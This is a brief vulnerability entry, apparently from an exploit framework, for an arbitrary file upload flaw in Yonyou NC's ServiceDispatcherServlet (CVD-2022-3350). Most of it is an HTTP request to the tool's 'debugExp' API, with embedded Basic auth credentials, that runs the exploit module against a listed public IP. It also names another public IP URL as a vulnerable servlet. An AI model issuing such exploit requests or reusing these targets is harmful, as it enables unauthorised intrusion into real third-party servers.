# 用友 NC ServiceDispatcherServlet 任意文件上传漏洞

    Yonyou NC ServiceDispatcherServlet Arbitrary File Upload Vulnerability

## CVD-2022-3350

```
http://218.17.49.60:8084/ServiceDispatcherServlet
```

```
POST /api/v1/debugExp HTTP/1.1
Content-Type: application/json;charset=UTF-8
Authorization: Basic dXNlcjpwYXNz
host: 82.156.29.211:8365
Connection: close
Content-Length: 83

{"hostinfo":"http://61.163.121.214:65","vulfile":"CVD-2022-3350.go","expparams":{}}
```
